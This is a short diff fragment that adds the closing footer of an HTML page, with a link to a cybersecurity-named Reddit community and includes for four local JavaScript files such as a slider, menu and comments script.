+        <a href="https://www.reddit.com/r/CIBERSECHYDRA__/" class="footer__icons"><img src="images/reddit.png"
+            class="footer__im" /></a>
+
+    </section>
+  </footer>
+
+  <script src="./js/slider.js"></script>
+  <script src="./js/questions.js"></script>
+  <script src="./js/menu.js"></script>
+  <script src="./js/comentarios.js"></script>
+</body>
+
+</html>
